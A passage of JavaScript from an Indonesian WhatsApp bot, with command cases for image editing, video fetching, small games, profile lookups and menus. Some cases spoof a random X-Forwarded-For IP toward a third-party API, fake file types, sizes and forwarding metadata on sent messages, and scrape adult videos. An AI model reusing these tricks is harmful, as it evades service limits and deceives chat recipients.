 const output = 'output.jpg'; // Nama file output
 
 // Menggunakan sharp untuk meningkatkan kualitas gambar
 sharp(media)
 .resize({ width: 3840 }) // Resize gambar ke lebar 3840px (4K resolution)
 .modulate({
 brightness: 1.2, // Meningkatkan kecerahan
 contrast: 1.1, // Meningkatkan kontras
 saturation: 1.1 // Meningkatkan saturasi
 })
 .sharpen() // Menambahkan ketajaman
 .toFile(output, async (err, info) => {
 if (err) {
 console.error(`Error: ${err.message}`);
 return m.reply(`Error: ${err.message}`);
 }
 
 console.log(`Image processed: ${info}`);
 
 // Mengunggah gambar yang telah ditingkatkan kualitasnya
 const url = await TelegraPh(output);
 sky.sendMessage(m.chat, { caption: `_Success To Enhanced Image_`, image: { url } }, { quoted: m });
 
 // Menghapus file setelah selesai
 fs.unlinkSync(output);
 fs.unlinkSync(media);
 });
 } catch (err) {
 console.error(`Error: ${err.message}`);
 return m.reply(`Error: ${err.message}`);
 }
}
break
case 'imgedit': {
 const sharp = require('sharp');
 const fs = require('fs');
 const { createCanvas } = require('canvas');
 const { TelegraPh } = require('./lib/uploader'); // Import TelegraPh

 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';
 const operation = m.text.split(' ')[1]; // Mengambil operasi dari pesan

 if (!mime || !mime.includes('image')) return m.reply(`Mana gambarnya bang?`);
 if (!operation) return m.reply(`Silakan tentukan operasi yang ingin Anda terapkan pada gambar:
> resize\n> crop\n> rotate\n> flip\n> grayscale\n> blur\n> mirror\n> brightness\n> contrast\n> sharpen\n> emboss\n> oilpaint\n> posterize\n> pixelate\n> sepia\n> gamma\n> negate\n> threshold\n> edgedetect\n> normalize\n> median\n> tint\n> modulate\n> flatten\n> background\n> resizeCanvas\n> trim\n> flop\n> extend`);

 m.reply(mess.wait);

 try {
 const media = await sky.downloadAndSaveMediaMessage(q);
 const output = 'output.jpg'; // Nama file output

 // Menggunakan sharp untuk berbagai operasi
 let imageSharp = sharp(media);

 if (operation === 'resize') {
 imageSharp = imageSharp.resize(800, 600); // Ubah sesuai kebutuhan
} else if (operation === 'crop') {
 imageSharp = imageSharp.extract({ width: 100, height: 100, left: 10, top: 10 });
} else if (operation === 'rotate') {
 imageSharp = imageSharp.rotate(90);
} else if (operation === 'flip') {
 imageSharp = imageSharp.flip();
} else if (operation === 'grayscale') {
 imageSharp = imageSharp.grayscale();
} else if (operation === 'blur') {
 imageSharp = imageSharp.blur(5); // Ubah sesuai kebutuhan
} else if (operation === 'mirror') {
 imageSharp = imageSharp.flip().rotate(180);
} else if (operation === 'brightness') {
 imageSharp = imageSharp.modulate({ brightness: 50 });
} else if (operation === 'contrast') {
 imageSharp = imageSharp.modulate({ contrast: 50 });
} else if (operation === 'sharpen') {
 imageSharp = imageSharp.sharpen(0.5); // Parameter opsional untuk mengatur intensitas ketajaman (0.2 - 100)
} else if (operation === 'emboss') {
 imageSharp = imageSharp.emboss(0.5); // Parameter opsional untuk mengatur intensitas relief (0 - 10)
} else if (operation === 'oilpaint') {
 imageSharp = imageSharp.oilpaint(2); // Parameter opsional untuk mengatur kehalusan lukisan minyak (0 - 100)
} else if (operation === 'posterize') {
 imageSharp = imageSharp.posterize(8); // Parameter opsional untuk mengatur jumlah level posterisasi (2 - 256)
} else if (operation === 'pixelate') {
 imageSharp = imageSharp.median(20);
} else if (operation === 'sepia') {
 imageSharp = imageSharp.sepia(100); // Parameter opsional untuk mengatur intensitas efek sepia (0 - 100)
} else if (operation === 'gamma') {
 imageSharp = imageSharp.gamma(1.6); // Parameter opsional untuk mengatur nilai gamma (0.1 - 10)
} else if (operation === 'negate') {
 imageSharp = imageSharp.negate();
} else if (operation === 'threshold') {
 imageSharp = imageSharp.threshold(128, { grayscale: true }); // Parameter opsional untuk mengatur apakah gambar diubah menjadi skala abu-abu sebelum atau sesudah penerapan threshold
} else if (operation === 'edgedetect') {
 imageSharp = imageSharp.edge();
} else if (operation === 'normalize') {
 imageSharp = imageSharp.normalize();
} else if (operation === 'median') {
 imageSharp = imageSharp.median(3); // Parameter opsional untuk mengatur ukuran kernel median (3 - 100)
} else if (operation === 'tint') {
 imageSharp = imageSharp.tint('#ff0000', 0.5); // Parameter opsional untuk mengatur kekuatan efek pewarnaan (0 - 1)
} else if (operation === 'modulate') {
 imageSharp = imageSharp.modulate({ hue: 180 });
} else if (operation === 'flatten') {
 imageSharp = imageSharp.flatten({ background: '#ffffff' });
} else if (operation === 'background') {
 imageSharp = imageSharp.background({ r: 255, g: 255, b: 255 }); // Parameter opsional untuk mengatur warna latar belakang dan opasitasnya
} else if (operation === 'resizeCanvas') {
 imageSharp = imageSharp.resize({ width: 1000, height: 800, fit: 'contain' });
} else if (operation === 'trim') {
 imageSharp = imageSharp.trim(50, { tolerance: 10 }); // Parameter opsional untuk mengatur batas toleransi trim
} else if (operation === 'flop') {
 imageSharp = imageSharp.flop();
} else if (operation === 'extend') {
 imageSharp = imageSharp.extend({ top: 10, bottom: 10, left: 10, right: 10 }); // Parameter opsional untuk mengatur warna latar belakang dan opasitasnya
} else {
 return m.reply(`Operasi ${operation} tidak didukung`);
 }
 imageSharp.toFormat('jpeg')
 .toFile(output, async (err, info) => {
 if (err) {
 console.error(`Error: ${err.message}`);
 fs.unlinkSync(media);
 return m.reply(`Error: ${err.message}`);
 }
 console.log(`Image processed: ${info}`);
 try {
 // Mengunggah gambar yang telah diproses
 const url = await TelegraPh(output);
 sky.sendMessage(m.chat, { caption: `_Success To Edited Image_`, image: { url } }, { quoted: m });
 } catch (uploadError) {
 console.error(`Upload Error: ${uploadError.message}`);
 m.reply(`Upload Error: ${uploadError.message}`);
 }
 // Menghapus file setelah selesai
 fs.unlinkSync(output);
 fs.unlinkSync(media);
 });
 } catch (err) {
 console.error(`Error: ${err.message}`);
 m.reply(`Error: ${err.message}`);
 }
}
break
case 'playptv': {
 if (!text) return m.reply(`_judul weh ${pushname}_:`);

 let wait = await sky.sendMessage(m.chat, { text: `_sbr lg nyari..._` }, { quoted: m, ephemeralExpiration: m.expiration });

 let yts = require("yt-search");
 
 // Function untuk mengunduh video menggunakan API
 async function mp4(url) {
 try {
 const response = await fetch('https://api.zeemo.ai/hy-caption-front/api/v1/video-download/yt-dlp-video-info', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': '*/*',
 'User-Agent': 'Postify/1.0.0'
 },
 body: JSON.stringify({ url, videoSource: 3 })
 });
 const { data } = await response.json();
 return {
 status: true,
 creator: '@avosky',
 title: data.videoName,
 url: data.sourceVideoUrl,
 media: data.downloadUrl
 };
 } catch {
 return {
 status: false,
 msg: 'Data tidak dapat ditemukan!'
 };
 }
 }

 // Lakukan pencarian video menggunakan teks yang diberikan
 let search = await yts(`${text}`);
 
 if (!search || !search.videos || search.videos.length === 0) {
 return m.reply('Video tidak ditemukan.');
 }

 // Unduh video dari URL menggunakan function mp4
 let vid = await mp4(`${search.videos[0].url}`);

 // Cek apakah video berhasil diunduh
 if (!vid.status) {
 return m.reply(vid.msg);
 }

 // Buat teks caption dengan detail video
 const ytc = `
_Tittle:_ ${vid.title}
_Date:_ Tidak tersedia
_Duration:_ Tidak tersedia
_Quality:_ Tidak tersedia
`;

 // Siapkan media untuk pesan ptv
 var ppt = await prepareWAMessageMedia({ video: { url: vid.media } }, { upload: sky.waUploadToServer });
 var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({ "ptvMessage": ppt.videoMessage, caption: `done banh`, fileLength: 9999999999 }), { userJid: from });

 // Kirim pesan ptv
 sky.relayMessage(from, ptv.message, { messageId: ptv.key.id });
 
 // Kirim pesan dengan informasi video
 await sky.sendMessage(m.chat, { text: ytc });

 // Edit pesan menunggu
 await sky.sendMessage(m.chat, { text: `_bentar_`, edit: wait.key }, { quoted: m, ephemeralExpiration: m.expiration });
}
break
//casenya
case 'teka': {
if (sender in petakteka) return m.reply(`Kamu masih dalam permainan teka-teki! Lanjutkan!\n\n${petakteka[sender].board.join("")}\n\nKirim ${prefix}delteka untuk mengakhiri permainan.`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakteka[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
nyawa: 3,
pick: 0
};
await m.reply(`_PILIH ANGKA_

${petakteka[sender].board.join("")}

Pilih angka yang kamu yakini memiliki hadiah!`);
}
break
case 'delteka': {
if (!(sender in petakteka)) return m.reply(`Kamu tidak sedang bermain teka-teki!`)
delete petakteka[sender];
sky.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
m.reply(`Permainan teka-teki dihentikan.`);
}
break
// Case untuk memulai permainan Petak Misteri
case 'mystery': {
  if (sender in petakmystery) return m.reply(`Permainan Anda masih belum selesai. Lanjutkan?\n\n${petakmystery[sender].board.join("")}\n\nKirim ${prefix}delmystery untuk mengakhiri permainan Petak Misteri`);
  function shuffle(array) {
    return array.sort(() => Math.random() - 0.5);
  }
  petakmystery[sender] = {
    petak: shuffle([0, 0, 0, 0, 0, 0, 0, 0, 0, 0]),
    board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
    pick: 0
  };
  await m.reply(`_Pilih Petak Misteri_\n\n${petakmystery[sender].board.join("")}\n\nPilih kotak untuk mengungkap hadiah atau tantangan misteri!`);
}
break
// Case untuk mengakhiri permainan Petak Misteri
case 'delmystery': {
  if (!(sender in petakmystery)) return m.reply(`Anda tidak sedang bermain Petak Misteri!`);
  delete petakmystery[sender];
  m.reply(`Permainan Petak Misteri telah diakhiri. Hadiah: Rp. 0`);
}
break

// Case untuk mengakhiri permainan Key Quest
case 'bomb': {
if (sender in petakbom) return m.reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["💚", "💛", "🤍"]
};
await m.reply(`_Pilih Bomb_

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
}
break
case 'delbomb': {
if (!(sender in petakbom)) return m.reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
sky.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
m.reply(`Petakbom di akhiri, hadiah Rp. 0`)
}
break
case 'ttcapt': {
 if (!text) throw `Put Link`
 const { data } = await axios.get(`https://widipe.com/download/tikdl?url=${q}`);
 m.reply(`${data.result.title}`.trim());
}
break

case 'getname': {
 const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
 if (m.quoted || text) {
 if (froms && db && db.users && db.users.hasOwnProperty(froms)) {
 m.reply(`${db.users[froms].name}`);
 } else if (froms) {
 const name = await sky.getName(froms);
 m.reply(`${name}`);
 } else {
 m.reply('Tag atau reply pesan target!');
 }
 } else {
 m.reply('Tag atau reply pesan target!');
 }
}
break
case 'getbio': {
 const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
 if (froms) {
 let biou = (await sky.fetchStatus(froms).catch(err => {
 console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err));
 return {};
 })).status || 'Bio di private!';
 m.reply(biou);
 } else {
 m.reply('Tag atau reply pesan target!');
 }
}
break
case 'menurandom': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENU RANDOM

> COFFEE
> QUOTESANIME
> MOTIVASI
> DILANQUOTE
> QUOTESIMAGE
> BUCINQUOTE
> KATASENJA
> PUISI
> PANTUN
> COUPLE
> ANIME
> RANDOMMEME
> MEMEINDO
> DARKJOKE
> WAIFU
> HUSBU
> NEKO
> SHINOBU
> WAIFUS
> NEKOS
> TRAP
> BLOWJOB
> CRY
> KILL
> HUG
> PAT
> LICK
> KISS
> BITE
> YEET
> BULLY
> BONK
> GETPP
> GETBIO
> GETNAME 
> WINK
> POKE
> NOM
> SLAP
> SMILE
> WAVE
> AWOO
> BLUSH
> SMUG
> GLOMP
> HAPPY
> DANCE
> CRINGE
> CUDDLE
> HIGHFIVE
> SHINOBU
> HANDHOLD
> WOOF
> 8BALL
> GOOSE
> GECG
> FEED
> AVATAR
> FOX_GIRL
> LIZARD
    `
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break;
case 'menuanime': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
    let docs = fs.readFileSync('./src/sky.ppt');  // Menggunakan titik koma
    let listfakedocs = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf'
    ];
    // Fungsi getPp untuk mengambil gambar profil
    async function getPp(sky, target) {
        try {
            const response = await sky.query({
                tag: "iq",
                attrs: {
                    target: target,
                    to: "@s.whatsapp.net",
                    type: "get",
                    xmlns: "w:profile:picture"
                },
                content: [{
                    tag: "picture",
                    attrs: {
                        type: "image",
                        query: "url"
                    }
                }]
            });
            return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
        }
    }

    // Ambil profile picture menggunakan getPp
    let profile = await getPp(sky, m.sender);

    const menunya = `≫ MENU ANIME 2

┌ ◦ NARUTO
│ ◦ SASUKE
│ ◦ LUFFY
│ ◦ GOKU
│ ◦ VEGETA
│ ◦ ICHIGO
│ ◦ EREN
│ ◦ MIKASA
│ ◦ LEVI
│ ◦ GON
│ ◦ KILLUA
│ ◦ HISOKA
│ ◦ EDWARD
│ ◦ ALPHONSE
│ ◦ WINRY
│ ◦ LIGHT
│ ◦ RYUK
│ ◦ KEN
│ ◦ KANEKI
│ ◦ TOKA
│ ◦ IZUKU
│ ◦ BAKUGO
│ ◦ ALLMIGHT
│ ◦ DEKU
│ ◦ MOB
│ ◦ LOLI
│ ◦ REIGEN
│ ◦ TERU
│ ◦ NARANCIA
│ ◦ GIORNO
│ ◦ JOTARO
│ ◦ DIO
│ ◦ KIRA
│ ◦ SHINICHI
│ ◦ RAN
│ ◦ CONAN
│ ◦ KAITO
│ ◦ AIZEN
│ ◦ BYAKUYA
│ ◦ HITSUGAYA
│ ◦ ORIHIME
│ ◦ GINTOKI
│ ◦ SHINPACHI
│ ◦ KAGURA
│ ◦ ZURA
│ ◦ MAKOTO
│ ◦ HARU
│ ◦ RIN
│ ◦ NAGISA
│ ◦ SAITAMA
│ ◦ GENOS
│ ◦ MUMEN
│ ◦ BOROS
│ ◦ GOHAN
│ ◦ PICCOLO
│ ◦ KRILLIN
│ ◦ FRIEZA
│ ◦ VEGETO
│ ◦ GOTEN
│ ◦ TRUNKS
│ ◦ CELL
│ ◦ NEJI
│ ◦ ROCKLEE
│ ◦ TENTEN
│ ◦ ITACHI
│ ◦ KAKASHI
│ ◦ SAKURA
│ ◦ TSUNADE
│ ◦ GAARA
│ ◦ NEKU
│ ◦ SHIKI
│ ◦ JOSHUA
│ ◦ BEAT
│ ◦ NAOTO
│ ◦ KANJI
│ ◦ RISE
│ ◦ YOSUKE
│ ◦ MAKOTO
│ ◦ YUSUKE
│ ◦ ANN
│ ◦ MORGANA
│ ◦ RYUJI
│ ◦ FUTABA
│ ◦ HARU
│ ◦ AIGIS
│ ◦ MAKOTO
│ ◦ YUKIKO
│ ◦ CHIE
│ ◦ NANAKO
│ ◦ YUKARI
│ ◦ JUNPEI
│ ◦ MITSURU
│ ◦ AKIHIKO
│ ◦ YUSUKE
│ ◦ MAKOTO
│ ◦ FUTABA
│ ◦ HARU
│ ◦ FRODO
│ ◦ SAM
│ ◦ ARAGORN
│ ◦ GANDALF
│ ◦ LEGOLAS
│ ◦ GIMLI
│ ◦ BOROMIR
│ ◦ SMEAGOL
│ ◦ HARRY
│ ◦ RON
│ ◦ HERMIONE
│ ◦ DUMBLEDORE
│ ◦ VOLDEMORT
│ ◦ SNAPE
│ ◦ MALFOY
│ ◦ HAGRID
│ ◦ BILBO
│ ◦ THORIN
└ ◦ SMAUG`
    await sky.sendMessage(m.chat, {
        document: docs,
        fileName: `Hai Kak ${pushname}`,
        mimetype: pickRandom(listfakedocs),
        fileLength: 100000000000,  // Sesuaikan dengan ukuran file yang lebih realistis
        pageCount: 999,  // Sesuaikan dengan dokumen yang dikirim
        caption: menunya,
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '0@newsletter',
                serverMessageId: null,
                newsletterName: 'Hello Everyone My name is Avosky'
            },
            externalAdReply: {
                title: `${hariini} ⏲️`,
                body: `${runtime(uptime)}`,
                showAdAttribution: true,
                thumbnailUrl: profile,  // Menggunakan profil yang didapat dari getPp
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: 'https://avosky.com',
                sourceUrl: 'https://avosky.com'
            }
        }
    }, { quoted: fkontak });
}
break;
case 'promptmaker': {
 if (!text) throw `Contoh: ${prefix + command} blonde girl`;
 const apiUrl = `https://itzpire.com/ai/promptGen?prompt=${encodeURIComponent(text)}`;
 m.reply('Sedang mengambil data, mohon tunggu sebentar...');
 fetch(apiUrl)
 .then(response => response.json())
 .then(data => {
 if (data.status) {
 const prompt = data.data
 m.reply(`${prompt}`);
 } else {
 m.reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
 }
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
 });
}
 break
case 'img-desc': {
 const uploadImage = require('./lib/uploadImage');
 if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*');

 class Pally {
 static async describeImage(img) {
 try {
 const { data: { url, sasString, blobName } } = await axios.post("https://pallyy.com/api/images/getUploadURL");
 await axios.put(`${url}captions/${blobName}?${sasString}`, img, {
 headers: {
 "content-type": "application/octet-stream",
 "x-ms-blob-type": "BlockBlob",
 "x-ms-blob-content-type": "image/jpeg",
 'user-agent': 'Postify/1.0.0',
 'x-forwarded-for': Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.')
 },
 });

 const analysis = await axios.post("https://pallyy.com/api/images/analysis", { blobName });
 const tags = analysis.data.tagsResult.values.map(tag => tag.name); // Mengambil nama tag
 const describe = await axios.post("https://pallyy.com/api/images/description", { analysis: analysis.data });

 return { description: describe.data[0], tags };
 } catch (error) {
 console.error(error.response?.data || error.message);
 return null;
 }
 }

 static async fromUrl(imageUrl) {
 try {
 const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
 const img = Buffer.from(response.data);
 return await this.describeImage(img);
 } catch (error) {
 console.error(error.message);
 return null;
 }
 }
 }

 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 
 if (!/image\/(png|jpe?g|gif)/.test(mime)) {
 m.reply('Format media tidak didukung. Harap unggah gambar.');
 return;
 }

 let media = await q.download();
 let imageUrl = await uploadImage(media); // Upload media jika diperlukan
 const result = await Pally.fromUrl(imageUrl);

 if (result) {
 m.reply(`Prompt:\n> ${result.description}\n\nTags:\n> ${result.tags.join(', ')}`);
 } else {
 m.reply('Terjadi kesalahan dalam mendeskripsikan gambar.');
 }
 } catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan');
 }
}
break;


case 'pantun': {
 const pantuns = [
 "Pergi ke pasar membeli jamu,\nTak lupa membeli rambutan.\nJika ingin hati senang selalu,\nJangan lupa rajin ibadah dan kebaikan.",
 "Buah mangga buah kedondong,\nDi bawah pohon duduk berdua.\nCinta datang tidak diundang,\nTapi membuat hati bahagia.",
 "Burung merpati terbang ke awan,\nSinggah sebentar di pohon jati.\nJanganlah kita suka bermusuhan,\nLebih baik selalu berbagi.",
 "Anak ayam turun sepuluh,\nMati satu tinggal sembilan.\nMari kita hidup dengan sungguh,\nJangan lupa pada kebaikan.",
 "Jalan-jalan ke kota Blitar,\nJangan lupa beli suvenir.\nJika ingin hidup lebih pintar,\nBelajarlah dengan tekun dan penuh gairah.",
 "Pagi-pagi makan bubur,\nBubur enak makan bersama.\nJika kita hidup jujur,\nHati senang penuh bahagia.",
 "Ke pasar beli ikan tenggiri,\nJangan lupa beli terasi.\nKalau kita saling menghargai,\nPasti hidup damai dan berseri.",
 "Ada udang di balik batu,\nJangan sampai kita tertipu.\nMari kita hidup bersatu,\nJangan sampai kita berpisah padu.",
 "Burung gagak terbang tinggi,\nHinggap sebentar di pohon mangga.\nJika kita hidup rukun dan damai,\nPasti hidup penuh bahagia.",
 "Pagi-pagi minum kopi,\nKopi enak diminum sendiri.\nJika ingin hati selalu berseri,\nJangan lupa untuk berbagi.",
 "Naik kapal ke pulau Bali,\nJangan lupa membeli cendera mata.\nJika ingin hidup selalu berarti,\nBerbuat baiklah pada sesama.",
 "Bunga mawar bunga melati,\nMekar indah di taman sari.\nJika ingin hidup penuh arti,\nSelalu berbuat baik dengan hati.",
 "Ke pasar beli cabai,\nJangan lupa beli tomat.\nJika ingin hidup damai,\nJangan lupa berbagi rahmat.",
 "Naik gunung melihat pemandangan,\nIndahnya alam penuh pesona.\nJika kita saling menghormati,\nPasti hidup penuh harmoni.",
 "Burung hantu terbang malam,\nHinggap di pohon tinggi.\nJika ingin hidup tentram,\nHargailah orang lain dengan hati."
 ];

 // Mengambil pantun acak
 const randomPantun = pantuns[Math.floor(Math.random() * pantuns.length)];

 // Mengirimkan pantun ke chat
 m.reply(randomPantun);
}
break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
 const { hentai } = require('./lib/scraper.js')
 anu = await hentai()
 result912 = anu[Math.floor(Math.random(), anu.length)]
 sky.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `> Title : ${result912.title}\n> Category : ${result912.category}\n> Mimetype : ${result912.type}\n> Views : ${result912.views_count}\n> Shares : ${result912.share_count}\n> Source : ${result912.link}\n> Media Url : ${result912.video_1}` }, { quoted: m })
 }
 break
case 'bot': {
 const sadQuotes = [
 "Hidup memang penuh liku-liku, kadang kita harus merasakan kepedihan untuk bisa tumbuh.",
 "Rasa sedih adalah teman setia dalam perjalanan hidup yang penuh warna.",
 "Ketika hujan turun, ia seolah-olah mencerminkan perasaan sedih yang sulit diungkapkan.",
 "Terluka bukanlah akhir dari segalanya, melainkan awal dari kekuatan yang baru.",
 "Kadang, senyuman terdalam tersembunyi di balik cerita paling sedih.",
 "Ketidakpastian hidup membuatnya begitu menarik, namun juga menyisakan rasa sedih yang mendalam.",
 "Sedih bukanlah kelemahan, melainkan keberanian untuk merasakan emosi yang mendalam.",
 "Di balik setiap tangis, ada kekuatan yang tumbuh dan berkembang.",
 "Momen paling indah seringkali datang dari pengalaman paling sedih.",
 "Hidup ibarat novel, terkadang kita harus melewati bab sedih untuk mencapai akhir yang bahagia.",
 "Mata yang menangis seringkali menyimpan cerita yang sulit diutarakan oleh bibir.",
 "Perjalanan hidup seringkali diwarnai oleh kenangan sedih yang sulit dilupakan.",
 "Ketika malam datang, seringkali hati terasa lebih berat dengan beban kesedihan yang terpendam.",
 "Rindu dan kesepian seringkali menjadi sahabat setia dalam keheningan malam yang sunyi.",
 "Terkadang, senyuman palsu lebih dalam dari luka yang sebenarnya.",
 "Kesedihan adalah bagian tak terpisahkan dari kisah hidup yang kita jalani.",
 "Setiap tetesan hujan adalah pelukan dari langit yang mencoba mengerti kesedihan di hati manusia.",
 "Dalam kegelapan malam, kadang kita menemukan keindahan dalam kesendirian dan kesedihan.",
 "Mata yang sedih seringkali mencerminkan kebijaksanaan yang telah merasakan banyak cerita.",
 ];
 const randomSadQuote = sadQuotes[Math.floor(Math.random() * sadQuotes.length)];
 sendButton(m.chat, randomSadQuote , 'next', 'bot');
 }
 break
case 'pin3': {
 const gis = require("g-i-s");

 async function pinterest(query) {
 return new Promise((resolve, reject) => {
 let err = { status: 404, message: "Terjadi kesalahan" };
 gis({ searchTerm: query + ' site:id.pinterest.com' }, (er, res) => {
 if (er) return err;
 let hasil = {
 status: 200,
 creator: 'chibot',
 result: []
 };
 res.forEach(x => hasil.result.push(x.url));
 resolve(hasil);
 });
 });
 }

 // Menggunakan case
 const query = args.join(" ");
 if (!query) {
 return m.reply("Berikan kata kunci untuk pencarian di Pinterest.");
 }

 pinterest(query)
 .then((result) => {
 if (result.status === 200 && result.result.length > 0) {
 const randomIndex = Math.floor(Math.random() * result.result.length);
 const imageUrl = result.result[randomIndex];
 sky.sendFile(from, imageUrl, 'pinterest.jpg', 'Ini hasil pencarian Pinterest.');
 } else {
 m.reply("Tidak ada hasil yang ditemukan untuk pencarian ini.");
 }
 })
 .catch((error) => {
 console.error("Error:", error);
 m.reply("Terjadi kesalahan saat mencari di Pinterest.");
 });
}
 break
 case 'pinterest': {
  if (!isPrem) return replyprem(mess.premium)
 const gis = require("g-i-s");
 const baileys = require("@whiskeysockets/baileys");
const { proto } = baileys;

 const [query, count] = text.split(' | ');

 if (!query || !count || isNaN(count)) {
 return m.reply(`Contoh: ${prefix + command} naruto | 3`);
 }

 m.reply(mess.wait);

 const pinterest = async (query) => {
 return new Promise((resolve, reject) => {
 let err = { status: 404, message: "Terjadi kesalahan" };
 gis({ searchTerm: query + ' site:id.pinterest.com' }, (error, results) => {
 if (error) return reject(error);
 let hasil = {
 status: 200,
 creator: 'chibot',
 result: []
 };
 results.forEach(x => hasil.result.push(x.url));
 resolve(hasil);
 });
 });
 };

 let anu;
 try {
 anu = await pinterest(query);
 } catch (error) {
 return m.reply(`Terjadi kesalahan saat mengambil gambar: ${error.message}`);
 }

 const shuffleArray = (array) => {
 for (let i = array.length - 1; i > 0; i--) {
 const j = Math.floor(Math.random() * (i + 1));
 [array[i], array[j]] = [array[j], array[i]];
 }
 return array;
 };

 anu.result = shuffleArray(anu.result);

 const numImagesToSend = parseInt(count);
 const selectedImages = anu.result.slice(0, numImagesToSend);

 if (selectedImages.length === 0) {
 return m.reply('Tidak ada gambar yang ditemukan.');
 }

 const generateImageMessage = async (imageUrl) => {
 const { imageMessage } = await baileys.generateWAMessageContent({
 image: { url: imageUrl }
 }, {
 upload: sky.waUploadToServer
 });
 return imageMessage;
 };

 const cards = [];
 for (const image of selectedImages) {
 const imageMsg = await generateImageMessage(image);
 const card = {
 footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: `Pilih gambar` }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Hasil Pencarian untuk ${query}`,
 hasMediaAttachment: true,
 imageMessage: imageMsg
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Slide","url":"${image}"}`
 }
 ]
 })
 };
 cards.push(card);
 }

